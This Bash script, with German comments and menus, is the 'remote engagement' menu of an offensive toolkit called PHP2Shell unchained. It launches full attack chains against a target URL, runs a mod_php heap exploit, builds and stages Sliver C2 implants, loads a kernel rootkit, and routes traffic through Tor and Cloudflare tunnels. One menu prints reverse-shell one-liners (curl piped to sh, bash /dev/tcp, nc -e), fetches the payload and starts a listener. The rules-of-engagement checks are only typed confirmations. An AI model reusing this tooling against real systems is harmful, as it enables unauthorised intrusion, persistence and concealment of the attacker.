#!/usr/bin/env bash
# Remote-Engagement Submenü — Wizard + Scope-Verwaltung + Session-Steuerung.
# Wird aus dem Hauptmenü (Taste [e]) aufgerufen; kann auch direkt laufen.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB_ROOT="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
source "$ROOT/remote/lib/scope.sh"
source "$ROOT/remote/lib/term.sh"
source "$ROOT/remote/lib/state.sh"
source "$ROOT/remote/lib/engage-lab-preset.sh"
source "$ROOT/remote/lib/engage-handoff.sh"
ORCH="$ROOT/remote/orchestrate.sh"

hdr() {
  clear 2>/dev/null || true
  cat <<'BANNER'
  ┌──────────────────────────────────────────────────────────────┐
  │   PHP2Shell unchained — REMOTE ENGAGEMENT (Produktiv, RoE)   │
  └──────────────────────────────────────────────────────────────┘
BANNER
  local n=0
  [[ -f "$(scope_file)" ]] && n=$(grep -cv '^\s*\(#\|$\)' "$(scope_file)" || true)
  echo "  Scope-Einträge: $n · Terminal-Backend: $(term_backend) · CONFIRM_ROE: ${CONFIRM_ROE:-<nicht gesetzt>}"
  if [[ -f "$ROOT/out/engage/.last-session" ]]; then
    echo "  Letzte Session: $(cat "$ROOT/out/engage/.last-session") → Menü [n] Nächste Schritte"
  fi
  echo
}

pick_session() {
  local base="$ROOT/out/engage" i=1
  [[ ! -d "$base" ]] && { echo "Keine Sessions."; return 1; }
  local -a sids=()
  for d in "$base"/*/; do
    local s; s="$(basename "$d")"
    [[ "$s" == "_kits" ]] && continue
    [[ -f "$d/state/00.env.TARGET_URL" ]] || continue
    sids+=("$s")
  done
  [[ ${#sids[@]} -eq 0 ]] && { echo "Keine Sessions."; return 1; }
  echo "  Sessions:"
  for s in "${sids[@]}"; do printf "    [%d] %s\n" "$i" "$s"; i=$((i+1)); done
  read -r -p "  Auswahl [1]: " c
  c="${c:-1}"
  [[ "$c" =~ ^[0-9]+$ ]] && (( c >= 1 && c <= ${#sids[@]} )) || return 1
  printf '%s' "${sids[$((c-1))]}"
}

cmd_scope() {
  hdr
  echo "  ── Scope (RoE-Nachweis: $(scope_file)) ──"
  echo
  if [[ -f "$(scope_file)" ]]; then cat -n "$(scope_file)"; else echo "  (leer — Datei existiert noch nicht)"; fi
  echo
  echo "  [a] Host/CIDR hinzufügen    [ENTER] zurück"
  read -r -p "  Auswahl: " c
  if [[ "$c" == "a" ]]; then
    read -r -p "  Host/CIDR: " h
    read -r -p "  RoE-Referenz (Ticket/Datum): " r
    [[ -n "$h" ]] && printf '%s  # RoE %s\n' "$h" "${r:-ohne Referenz}" >> "$(scope_file)"
    echo "  → eingetragen."
    sleep 1
  fi
}

cmd_lab_full_load() {
  hdr
  cat <<'LAB'
  ── Lab-Vollkette + Singularity LOAD (nur Docker-Lab / RoE) ──
  FPM-Ziel (Default http://172.21.0.2/) · mod_php :19288 · Sliver · RAAS · LOAD (LKM)
  Voraussetzung: vtbw-php2shell-lab up  (FPM-Target)
LAB
  echo
  local url_def; url_def="$(engage_lab_default_url)"
  read -r -p "  Ziel-URL [${url_def}]: " url
  url="${url:-$url_def}"
  read -r -p "  Listener-Port [4445]: " lport
  lport="${lport:-4445}"
  echo
  echo "  Scope: $(engage_lab_default_url) → CIDR ${ENGAGE_LAB_SCOPE:-172.21.0.0/24}"
  echo "  Singularity LOAD: CONFIRM VM-REBOOT-OK (Host-Kernel im Lab-Container)"
  read -r -p "  Tippe VM-REBOOT-OK zum Start: " sconfirm
  [[ "$sconfirm" != "VM-REBOOT-OK" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
  read -r -p "  RoE bestätigen — tippe ROE: " roe
  [[ "$roe" != "ROE" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }

  engage_lab_ensure_scope
  engage_export_lab_full_load "$lport"
  export TARGET_URL="$url"
  echo
  echo "  Starte Vollkette → $url (LHOST=$ENGAGE_LHOST:$ENGAGE_LPORT, Singularity=load)"
  bash "$ORCH" run "$url"
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_run_wizard() {
  hdr
  echo "  ── Neues Engagement (Vollkette) ──"
  echo
  read -r -p "  Ziel-URL (z.B. https://staging.example/index.php): " url
  [[ -z "$url" ]] && return 0
  local host; host="$(scope_url_host "$url")"
  if ! scope_host_in "$host"; then
    echo
    echo "  ⚠ '$host' steht NICHT in scope-authorized.txt."
    read -r -p "  Jetzt eintragen? (RoE-Referenz oder leer=Abbruch): " r
    [[ -z "$r" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }
    printf '%s  # RoE %s\n' "$host" "$r" >> "$(scope_file)"
  fi
  local lhost_def; lhost_def="$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' || echo '')"
  read -r -p "  Listener-IP (LHOST) [${lhost_def}]: " lhost; lhost="${lhost:-$lhost_def}"
  read -r -p "  Listener-Port [4444]: " lport; lport="${lport:-4444}"
  read -r -p "  Tor-Egress (Cloudflare über Tor-Exit)? [J/n]: " tor
  read -r -p "  Sliver C2 (compose/host auto)? [J/n]: " c2
  read -r -p "  Reverse-Shell-as-a-Service (lukechilds)? [J/n]: " rs
  read -r -p "  Cloudflare Tunnel (Listener + Sliver HTTPS)? [J/n]: " tun
  read -r -p "  Lab-External (Tor+Tunnel web/sliver, nur Lab-IP)? [J/n]: " ext
  read -r -p "  Jackalsyn selftest? [J/n]: " js
  read -r -p "  mod_php + Zer061 PoC (heap exploit.py)? [J/n]: " mp
  echo "  Singularity: detect | lab | load (LKM container-build) | full"
  read -r -p "  Singularity-Modus [lab]: " sg
  sg="${sg:-lab}"
  echo
  echo "  ── Zusammenfassung ──"
  echo "  Ziel:         $url"
  echo "  LHOST:        $lhost:$lport"
  echo "  Tor:          $([[ "$tor" =~ ^[nN] ]] && echo off || echo on)"
  echo "  Sliver C2:    $([[ "$c2" =~ ^[nN] ]] && echo none || echo sliver)"
  echo "  RAAS:         $([[ "$rs" =~ ^[nN] ]] && echo off || echo on)"
  echo "  Tunnel:       $([[ "$tun" =~ ^[nN] ]] && echo off || echo on)"
  echo "  External:     $([[ "$ext" =~ ^[nN] ]] && echo auto || echo on)"
  echo "  Jackalsyn:    $([[ "$js" =~ ^[nN] ]] && echo off || echo auto)"
  echo "  mod_php PoC:  $([[ "$mp" =~ ^[nN] ]] && echo off || echo auto)"
  echo "  Singularity:  ${sg:-lab}"
  echo "  Backend:      $(term_backend)"
  echo
  read -r -p "  START mit CONFIRM_ROE=I-AM-AUTHORIZED? Tippe ROE ein: " confirm
  [[ "$confirm" != "ROE" ]] && { echo "  Abgebrochen."; sleep 1; return 0; }

  export CONFIRM_ROE=I-AM-AUTHORIZED
  export ENGAGE_LHOST="$lhost" ENGAGE_LPORT="$lport" TARGET_URL="$url"
  export ENGAGE_C2=sliver ENGAGE_RS=on ENGAGE_JACKALSYN=auto ENGAGE_SINGULARITY="${sg:-lab}"
  export ENGAGE_FETCH_ALL=on ENGAGE_EXTERNAL=auto ENGAGE_MODPHP=auto
  if [[ "$tor" =~ ^[nN] ]]; then export ENGAGE_TOR=off; else export ENGAGE_TOR=on; fi
  [[ "$c2" =~ ^[nN] ]] && export ENGAGE_C2=none
  [[ "$rs" =~ ^[nN] ]] && export ENGAGE_RS=off
  if [[ "$tun" =~ ^[nN] ]]; then export ENGAGE_TUNNEL=off; else export ENGAGE_TUNNEL=on; fi
  [[ "$ext" =~ ^[nN] ]] && export ENGAGE_EXTERNAL=off
  [[ "$js" =~ ^[nN] ]] && export ENGAGE_JACKALSYN=off
  [[ "$mp" =~ ^[nN] ]] && export ENGAGE_MODPHP=off
  [[ "$sg" == "off" ]] && export ENGAGE_SINGULARITY=off
  if [[ "$sg" == "load" || "$sg" == "full" ]]; then
    read -r -p "  Singularity LOAD braucht CONFIRM — tippe VM-REBOOT-OK: " sconfirm
    [[ "$sconfirm" == "VM-REBOOT-OK" ]] && export CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK
  fi
  bash "$ORCH" run "$url"
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_resume() {
  hdr; local sid
  sid="$(pick_session)" || { echo "  Keine gültige Session (nur Ordner mit state/00.env.TARGET_URL)."; sleep 2; return 0; }
  export CONFIRM_ROE=I-AM-AUTHORIZED
  bash "$ORCH" resume "$sid" || { echo "  Resume fehlgeschlagen (Session $sid)."; sleep 2; }
  read -r -p "  ENTER für Menü… " _
}

cmd_next_steps() {
  hdr
  local sid
  if [[ -f "$ROOT/out/engage/.last-session" ]]; then
    sid="$(cat "$ROOT/out/engage/.last-session")"
    echo "  Letzte Session: $sid"
  else
    sid="$(pick_session)" || { sleep 1; return 0; }
  fi
  export ENGAGE_SID="$sid"
  engage_print_handoff
  read -r -p "  ENTER für Menü… " _
}

cmd_status() { hdr; bash "$ORCH" status; echo; read -r -p "  ENTER für Menü… " _; }

cmd_listeners() {
  hdr; local sid
  sid="$(pick_session)" || { echo "  Keine Session mit Listener-Phase."; sleep 1; return 0; }
  export CONFIRM_ROE=I-AM-AUTHORIZED
  bash "$ORCH" listeners "$sid"
  read -r -p "  ENTER für Menü… " _
}

cmd_report() {
  hdr; local sid
  sid="$(pick_session)" || { sleep 1; return 0; }
  local r="$ROOT/out/engage/$sid/REPORT.md"
  [[ -f "$r" ]] && ${PAGER:-less} "$r" || { echo "  Kein REPORT.md in $sid."; sleep 1; }
}

cmd_kits() {
  hdr
  bash "$ORCH" kits
  echo
  read -r -p "  ENTER für Menü… " _
}

cmd_rshell_variants() {
  hdr
  echo "  ── Reverse-Shell-as-a-Service (lukechilds) ──"
  echo
  if [[ ! -d "$ROOT/third_party/reverse-shell/.git" ]]; then
    echo "  Noch nicht gefetcht."
    read -r -p "  Jetzt fetch-reverse-shell ausführen? [J/n]: " f
    [[ ! "$f" =~ ^[nN] ]] && bash "$ROOT/scripts/fetch-reverse-shell.sh"
  fi
  local lh_def; lh_def="$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K[0-9.]+' || echo '')"
  read -r -p "  LHOST [${lh_def}]: " lh; lh="${lh:-$lh_def}"
  read -r -p "  LPORT [4445]: " lp; lp="${lp:-4445}"
  echo
  echo "  RAAS:  curl -fsSL 'https://reverse-shell.sh/${lh}:${lp}' | sh"
  echo "  Repo:  https://github.com/lukechilds/reverse-shell"
  echo "  bash:  bash -i >& /dev/tcp/$lh/$lp 0>&1"
  echo "  nc:    nc $lh $lp -e /bin/sh"
  echo
  read -r -p "  Payload jetzt ziehen + Listener spawnen? [J/n]: " go
  if [[ ! "$go" =~ ^[nN] ]]; then
    mkdir -p "$ROOT/out/rshell"
    if curl -fsSL --max-time 20 "https://reverse-shell.sh/${lh}:${lp}" -o "$ROOT/out/rshell/r"; then
      chmod 755 "$ROOT/out/rshell/r"
      echo "  Payload: $ROOT/out/rshell/r ($(wc -c < "$ROOT/out/rshell/r") Bytes)"
    else
      echo "  Payload-Fetch fehlgeschlagen (Internet?)."
    fi
    term_spawn_jobs "p2s-rshell" "$ROOT/out/rshell" \
      "listener-$lp|nc -lvnp $lp"
    echo "  Listener läuft (Backend: $(term_backend))."
  fi
  read -r -p "  ENTER für Menü… " _
}

cmd_sliver_ops() {
  hdr
  cat <<'SUB'
  ── Sliver (host binaries via fetch-sliver; compose läuft ggf. parallel) ──
    [1] fetch (fehlt)
    [2] Status
    [3] server-up (Compose)
    [4] Operator (einmalig, Compose)
    [5] mTLS Listener :8888
    [6] HTTPS Listener :8889 (für tunnel sliver-http)
    [7] Implant erzeugen (mTLS)
    [8] Implant staging (HTTP-Server out/sliver)
    [9] Konsole (interaktiv — Terminal!)
    [d] down
    [0] Zurück
SUB
  read -r -p "  Auswahl: " c
  case "$c" in
    1) bash "$ROOT/scripts/fetch-sliver.sh" ;;
    2) bash "$ROOT/scripts/lab-sliver.sh" status ;;
    3) bash "$ROOT/scripts/lab-sliver.sh" server-up ;;
    4) bash "$ROOT/scripts/lab-sliver.sh" operator ;;
    5) bash "$ROOT/scripts/lab-sliver.sh" listener ;;
    6) bash "$ROOT/scripts/lab-sliver.sh" http-listener ;;
    7) bash "$ROOT/scripts/lab-sliver.sh" implant ;;
    8) bash "$ROOT/scripts/lab-sliver.sh" stage ;;
    9) echo "  Hinweis: belegt dieses Terminal — Ctrl+D / exit für Rückkehr"; bash "$ROOT/scripts/lab-sliver.sh" console ;;
    d|D) bash "$ROOT/scripts/lab-sliver.sh" down ;;
  esac
  read -r -p "  ENTER für Menü… " _
}

cmd_singularity_ops() {
  hdr
  cat <<'SUB'
  ── Singularity (LKM — nur Lab/VM/autorisiert; kein Load auf Prod!) ──
    [1] fetch (Bundle)
    [2] Status
    [3] detect (Blue Team, read-only)
    [4] Runtime wählen (vm/host/container)
    [5] container-up (privileged)
    [6] LOAD — container-build (setup/LKM, VM-REBOOT-OK + I_UNDERSTAND_REBOOT)
    [7] container-shell (interaktiv)
    [8] host-check / host-build (Gefahr Host!)
    [9] vm-wizard / vm-up
    [0] Zurück
SUB
  read -r -p "  Auswahl: " c
  case "$c" in
    1) bash "$ROOT/scripts/fetch-singularity.sh" ;;
    2) bash "$ROOT/scripts/lab-singularity.sh" status ;;
    3) bash "$ROOT/scripts/lab-singularity.sh" detect ;;
    4) bash "$ROOT/scripts/lab-singularity.sh" runtime ;;
    5) bash "$ROOT/scripts/lab-singularity.sh" container-up ;;
    6)
      read -r -p "  LOAD nur Lab/VM — tippe VM-REBOOT-OK: " sconfirm
      if [[ "$sconfirm" == "VM-REBOOT-OK" ]]; then
        CONFIRM_SINGULARITY_ENGAGE=VM-REBOOT-OK CONFIRM_SINGULARITY_CONTAINER=I_UNDERSTAND_REBOOT \
          bash "$ROOT/scripts/lab-singularity.sh" container-build
      else
        echo "  Abgebrochen."
      fi
      ;;
    7) bash "$ROOT/scripts/lab-singularity.sh" container-shell ;;
    8) bash "$ROOT/scripts/lab-singularity.sh" host-check; bash "$ROOT/scripts/lab-singularity.sh" host-build ;;
    9) bash "$ROOT/scripts/lab-singularity.sh" vm-wizard; bash "$ROOT/scripts/lab-singularity.sh" vm-up ;;
  esac
  read -r -p "  ENTER für Menü… " _
}

cmd_modphp_ops() {
  hdr
  cat <<'SUB'
  ── mod_php + PoC (Zer061 heap / exploit.py) ──
    [1] fetch-zer061 (Bundle)
    [2] PoC gegen URL (aus Scope/Wizard)
    [3] Lab: apache-up + PoC :19288
    [0] Zurück
SUB
  read -r -p "  Auswahl: " c
  case "$c" in
    1) bash "$ROOT/scripts/fetch-zer061.sh" ;;
    2)
      read -r -p "  Ziel-URL (mod_php): " url
      if [[ -n "$url" ]]; then
        kit="$ROOT/third_party/zer061-php2shell/exploit.py"
        if [[ -f "$kit" ]]; then
          python3 "$kit" -u "$url"
        else
          echo "  Kit fehlt — [1] fetch"
        fi
      fi
      ;;
    3)
      bash "$ROOT/scripts/fetch-zer061.sh" 2>/dev/null || true
      bash "$ROOT/scripts/lab-apache-up.sh"
      kit="$ROOT/third_party/zer061-php2shell/exploit.py"
      if [[ -f "$kit" ]]; then
        python3 "$kit" -u "${LAB_APACHE_URL:-http://127.0.0.1:19288/index.php}"
      fi
      ;;
  esac
  read -r -p "  ENTER für Menü… " _
}

cmd_external_ops() {
  hdr
  cat <<'SUB'
  ── Lab-External (Compose: Tor + Quick Tunnels — Ziel muss Lab-Netz sein) ──
    [1] up (direkt)
    [2] up --tor (Exit-Verschleierung)
    [3] status
    [4] URLs aus state.env
    [5] down
    [0] Zurück
SUB
  read -r -p "  Auswahl: " c
  case "$c" in
    1)
      if ! bash "$ROOT/scripts/lab-external.sh" up; then
        echo "  FEHLER — Log: $ROOT/out/external/ops.log und out/tunnel/ops.log"
        echo "  Oft: vtbw-php2shell-lab up (FPM-Target) fehlt oder Netzwerkname geändert."
      fi
      ;;
    2)
      if ! bash "$ROOT/scripts/lab-external.sh" up --tor; then
        echo "  FEHLER — siehe out/external/ops.log"
      fi
      ;;
    3) bash "$ROOT/scripts/lab-external.sh" status ;;
    4) [[ -f "$ROOT/out/external/state.env" ]] && cat "$ROOT/out/external/state.env" || echo "kein state" ;;
    5) bash "$ROOT/scripts/lab-external.sh" down ;;
  esac
  read -r -p "  ENTER für Menü… " _
}

main_loop() {
  while true; do
    hdr
    cat <<'MENU'
    [1] Scope verwalten          scope-authorized.txt (RoE) anzeigen/eintragen
    [2] Engagement STARTEN       Wizard: URL · LHOST · Tor · Sliver · RAAS · Tunnel
    [l] Lab-Vollkette + LOAD       172.21.0.2 · mod_php :19288 · Sliver · Singularity LOAD
    [n] Nächste Schritte           tmux/Shells · was erreicht · Payloads (letzte Session)
    [3] Resume                   unterbrochene Session fortsetzen (CONFIRM_ROE wird gesetzt)
    [4] Status                   alle Sessions + Phasen-Fortschritt
    [5] Listener neu spawnen     Fenster für bestehende Session erneut öffnen
    [6] Report ansehen           REPORT.md der Session
    [7] Reverse-Shell RAAS       lukechilds-Payload ziehen + Listener
    [8] Unterprojekte            Kits: vorhanden / fehlend (Sliver, Tor, RAAS, …)
    [9] Sliver (Post-Ex)         status · operator · listener · https · console · stage · down
    [a] Singularity              status · detect · LOAD (container-build) · host · vm
    [b] Lab-External             up [--tor] · status · down · URLs (nur Lab-Target)
    [c] mod_php + PoC            fetch-zer061 · exploit.py · lab apache :19288
    [0] Zurück

MENU
    read -r -p "  Auswahl: " c
    case "${c:-}" in
      1) cmd_scope ;;
      2) cmd_run_wizard ;;
      l|L) cmd_lab_full_load ;;
      n|N) cmd_next_steps ;;
      3) cmd_resume ;;
      4) cmd_status ;;
      5) cmd_listeners ;;
      6) cmd_report ;;
      7) cmd_rshell_variants ;;
      8) cmd_kits ;;
      9) cmd_sliver_ops ;;
      a|A) cmd_singularity_ops ;;
      b|B) cmd_external_ops ;;
      c|C) cmd_modphp_ops ;;
      0|q|"") return 0 ;;
    esac
  done
}

main_loop
